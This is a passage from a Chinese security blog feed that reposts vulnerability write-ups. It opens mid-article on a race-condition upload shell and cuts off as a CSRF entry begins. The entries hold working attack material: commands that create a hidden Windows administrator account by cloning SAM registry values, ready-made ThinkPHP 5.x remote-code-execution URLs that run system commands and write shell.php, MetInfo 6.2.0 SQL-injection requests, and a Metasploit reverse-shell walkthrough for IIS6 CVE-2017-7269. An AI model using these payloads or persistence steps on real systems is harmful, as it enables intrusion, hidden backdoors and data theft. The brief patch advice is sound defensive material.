-&gt; 从中获取上传shell文件路径并用浏览器访问并不断刷新（CTRL+R） -&gt; 以这种方式再次让目标Web应用处于竞争条件下, 我们就占有了对上传shell文件的继续访问权。</p><p>一试，果然行。以下是触发反弹shell实现RCE的竞争条件逻辑图：</p><p><img src="https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png" alt></p><p>nc端监听返回的RCE结果：<br><img src="https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png" alt></p><h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>在上传文件本身被转移到云端S3存储桶之前，我们有可能获得上传文件的本地路径。哪怕只有1或2秒，就足以触发上传shell的成功反弹；</p><p>可多对上传或编辑功能点进行分析，如果它们是独立的调用，那么则需要比较它们可具体实现的操作。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows创建隐藏用户</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>在渗透Windows时当我们可以任意命令执行时就需要创建一个账号，然后再进行深入的渗透，为了保证渗透的隐蔽性和持久性，创建一个隐藏用户就是一个常用、基础且非常重要的技能。</p><p>为什么不直接抓admin的密码呢？因为我之前对某目标做渗透时吃了次亏，在正常的使用MSF抓密码的过程中不知道对哪里造成了损害，导致目标的admin密码被销毁，然后就登录不上……当然，抓admin的密码并登录也是可以收获很多有用的东西的，说不定桌面就放了一份密码表，但这要在已经成功创建好一个隐藏账号的前提下进行。</p><p>首先创建一个账号，Windows下以”$”结尾的就是一个隐藏账号，然后将这个账号添加入Admin组中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user wuyou$ 123456 /add</span><br><span class="line">net localgroup administrators wuyou$ /add</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/1.png" alt></p><p>如上图，使用”net user”查看时没有新创建的”wuyou$”用户<br>但是，在 计算机管理 -&gt; 本地用户和组 中还是可以找到这个隐藏账号<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/2.png" alt></p><p>所以说我们现在创建的这个隐藏账号的隐蔽性还不够高，还需要再进行一步操作。<br>打开注册表，找到下面这个位置<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/3.png" alt>.png</p><p>由于SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限（右键，然后点击权限，给予完全控制权限后重新打开注册表）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/4.png" alt></p><p>可以看到000001F4对应admin账号（随机生成一个十六进制来对应账号的name）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/5.png" alt></p><p>然后将注册表导出<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/6.png" alt></p><p>将隐藏账号的F键的值替换成admin的F键的值<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/7.png" alt></p><p>然后在cmd下删除之前创建的隐藏账号<br>net user wuyou$ /del<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/8.png" alt></p><p>然后双击执行我们之前导出并修改了的注册表文件<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/9.png" alt></p><p> 可以看到这个账号已成功添加入注册表中</p><p>但是在本地用户和组中找不到<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/10.png" alt></p><p>而且可以进行远程桌面连接<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/11.png" alt></p><p>当然，这种隐藏账号在注册表中是可以找到的，当我们想要删除这个隐藏账号时就需要从注册表下手了。</p><p>下面是在 Windows 10 中打开注册表编辑器的两种方法：<br>1.在任务栏上的搜索框中，键入“regedit”。然后，选择注册表编辑器（桌面应用）最上面的结果。<br>2.长按或右键单击“开始”按钮，然后依次选择“运行”。在打开：框中输入“regedit”，选择“确定”。</p><p><strong>转载于</strong>：<a href="http://zone.secevery.com/article/1110" target="_blank" rel="noopener">http://zone.secevery.com/article/1110</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x 路由缺陷导致远程代码执行</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ThinkPHP是一套国内流行的开源PHP MVC开发框架，其中存在3.x和5.x两个版本，目前3.x已停止维护，5.x为15年正式推出的，基本上对3.x进行了重构，针对于路由，也舍弃了默认的方式，正是因为新的路由存在缺陷，导致任意函数的调用。</p><h2 id="知识背景"><a href="#知识背景" class="headerlink" title="知识背景"></a>知识背景</h2><p>路由解析<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" alt></p><p>?s=index/index/hello</p><p>tp5中路由舍弃了3.x中的<strong>?m=index&amp;c=Index&amp;a=hello</strong>方式，而使用一个参数<strong>s</strong>传递所有信息，<strong>s=/index/Index/hello</strong>中三部分分别代表<strong>module,controller,action</strong>。此次出现问题的部分便是<strong>controller</strong>，由于<strong>ThinkPHP</strong>中命名空间和自动加载的作用，每个类都可被访问到，即导致每个类都可被当做<strong>controller</strong>。</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fy562obz8cj31dm0gg0vy.jpg" alt></p><p><strong>参数处理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public function index($name)&#123;</span><br><span class="line">        return &apos;Hello &apos;+$name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>?s=index/test/index&amp;name=world</code></p><p>参数会自动处理，当然也可为数组，比如</p><p><code>?s=index/test/index&amp;name[0]=world&amp;&amp;name[1]=xx</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" alt><br>在5.1.x中函数名为<strong>parseModuleAndClass</strong>，功能一样</p><p><strong>parseClass()</strong>函数：</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" alt></p><p>正常情况下会对<strong>name</strong>进行处理，限制在<strong>app\index\controller</strong>命名空间。</p><p>这里的<strong>name即为controller</strong>，前置处理为获取到<strong>module,controller,action</strong>，将<strong>controller</strong>传入该函数处理。</p><p><strong>当name中存在\时，直接将name赋值到class，不再进行parseClass操作，配合自动加载的机制从而导致可为任意命名空间下的类作为controller，任意public都可被用户访问到，结合ThinkPHP5内置的一些类和方法便可造成远程命令执行。</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>thinkphp/library/think/App.php 304-320行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 执行函数或者闭包方法 支持参数调用</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function 函数或者闭包</span><br><span class="line"> * @param array                 $vars     变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?s=index/think\app/invokefunction/function/call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>ReflectionFunction为PHP中的反射类，反射调用call_user_func_array，call_user_func_array为回调函数，回调system，参数为id</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg" alt></p><p>已知POC(来自t00ls)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">2、?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">3、?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">4、?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">5、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">6、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">7、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">8、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg" alt></p><p>该补丁为<strong>5.0.x</strong>补丁，<strong>5.1.x</strong>位置不一样，方式一样。</p><p>补丁方式为限制<strong>controller</strong>只能为字母和数字。并且放在<strong>controller</strong>处理之前。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说这个洞是由于用户控制了<strong>controller导致的，开发者将处理controller的代码封装到了Loader.php，并且与其他功能进行代码复用，为了满足其他功能增加的功能(即特殊处理存在\的参数)，从而导致了漏洞。代码复用是开发者优质的习惯，但也需要严格审核是否因为书写复用代码时是否会造成漏洞。</strong></p><p>另外，可以看到这是一个非常浅显的洞，至今没有人发现，最终由官方爆出，也许很多用户默认此开源框架“流行 == 安全”，其实很多应用并不是想象中的完全安全，漏洞经常发生在被人忽视的地方。</p><p>转载于：<a href="https://p0sec.net/index.php/archives/125/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/125/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>metinfo 6.2.0最新版本前台注入漏洞</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>metinfo 6.2.0最新版本前台注入漏洞<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p><h2 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h2><p>docker pull zksmile/vul:metinfov6.2.0</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h2><p>看到某个表哥发的metinfo 6.1.3最新注入（<a href="https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>前台，（<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ）作者在这里说需要注册会员，其实有一处不需要。漏洞详情<br>这里关键点在auth类的encode()和decode()方法。看下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里两个方法全都调用了authcode()方法，跟进authcode看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里decode和encode算法可逆，但我们需要知道$key的值，查看构造函数：<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[‘config’][‘met_webkeys’];<br>    }<br>这里$key的值是来源于met_webkeys这个配置，查看met_webkeys来源发现在安装的时候把这个key写入到./config/config_safe.php文件中。<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p><p>查看/config/config_safe.php文件，这里写入方式类似以下，但p牛在某篇文章中说过，这种是无法解析的，php后面必须要有一个空白字符，右键查看源代码即可得到met_webkeys，但有的会报错，根据这个表哥所说和php线程安全有关，本地试了下好像是这样。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p><p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>这里有两个利用点，简单说下其中一个。在register类的doemailvild()方法中，这里把用户提交的p参数进行了解密，并且传入到了get_user_valid()方法中。<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>查看get_user_valid()方法，这里又把解密后的值传入到了get_user_by_username()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p><p>查看get_user_by_username()方法，又传入了get_user_by_nameid()方法。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p><p>查看get_user_by_nameid()方法，直接拼接。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p><p>这里基本就清楚了，将auth类的authcode()方法copy本地。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p><p>访问本地文件得到加密后的字符串。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p><p>将加密后的字符串放到cookie，get或者post中，构造请求提交，延时注入成功。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>复现时需要注意的点：<br>1、php.ini中 short_open_tag=off</p><p>2、不管需不需要登录，最起码需要网站有一个会员存在。</p><p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p><p>这里有两个，一个是不需要登陆就可注入，另一个是coolcat表哥所说的需要以会员登陆。以下请自行替换p参数。</p><h4 id="1、不需要登陆"><a href="#1、不需要登陆" class="headerlink" title="1、不需要登陆"></a>1、不需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p><h4 id="2、-需要登陆"><a href="#2、-需要登陆" class="headerlink" title="2、 需要登陆"></a>2、 需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p><p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;自行添加登陆后的cookie&gt;</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前官网没有更新相关补丁。<br>白帽汇安全研究院建议限制config_safe.php的访问权限来进行应急修复。<br>Apache配置.htaccess文件：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p><p>Nginx在nginx.conf文件添加以下配置：</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p><p>文章转载于：<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7269 IIS6.0远程代码执行漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞编号：CVE-2017-7269<br>发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）<br>漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>漏洞类型：缓冲区溢出<br>漏洞等级：高危<br>影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）<br>触发函数：ScStoragePathFromUrl函数<br>附加信息：ScStoragePathFromUrl函数被调用了两次</p><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>复现环境：Microsoft Windows Server 2003 R2</p><p><img src="http://zone.secevery.com/uploads/article/20190421/a3f037a81fca524ab7e73b07a570a367.png" alt></p><p>开启了WebDAV服务</p><p><img src="http://zone.secevery.com/uploads/article/20190421/6728f3cc3e99686ee36fd23c44ac9f6c.png" alt></p><p>攻击者IP：192.168.1.144<br>目标机IP：192.168.1.175</p><p>exp:<a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a></p><p><img src="http://zone.secevery.com/uploads/article/20190421/32ee5fb6e63b209e64303c27d054c216.png" alt></p><p>把exp 复制到攻击机器的/usr/share/metasploit-framework/modules/exploits/windows/iis目录下</p><p><img src="http://zone.secevery.com/uploads/article/20190421/b5f1712c0adc2eda0a6ed9357f504787.png" alt></p><p>打开神器Metasploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/469cf4e103aaa38514880545f9f7f7cc.png" alt></p><p>输入use命令，use exploit/windows/iis/cve-2017-7269</p><p><img src="http://zone.secevery.com/uploads/article/20190421/9f52f610279f06c9041ddd0c8dd6b064.png" alt></p><p>使用命令show options</p><p><img src="http://zone.secevery.com/uploads/article/20190421/2d3b6a438a938dd8c02231da8ce4a0d3.png" alt></p><p>1.设置目标机ip,set RHOST 192.168.1.175<br>2.设置对面网站，set HttpHost 192.168.1.175<br>3.设置返回载荷，set payload windows/meterpreter/reverse_tcp<br>4.设置攻击机ip，set LHOST 192.168.1.144<br>5.进行溢出，exploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/914441442ce49de5dad761370de3fe0f.png" alt></p><p>输入shell命令，来到了我们所熟悉的界面</p><p><img src="http://zone.secevery.com/uploads/article/20190421/e530373752927a0db121aaffd1bab50a.png" alt></p><p>执行命令whoami</p><p><img src="http://zone.secevery.com/uploads/article/20190421/7c0533aea664a63ce89bfd8e600a8b24.png" alt></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>2015年7月15日，微软已停止对Windows Server 2003的支持，所以官方没有相关解决方案，建议用户升级到最新系统 Windows Server 2016。如果不进行升级的话，请直接关闭WebDAV服务防止漏洞被利用。</p><p>转载于：<a href="http://zone.secevery.com/article/1070" target="_blank" rel="noopener">http://zone.secevery.com/article/1070</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【转]CSRF漏洞劫持Youtube用户的通知消息</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/</url>
      
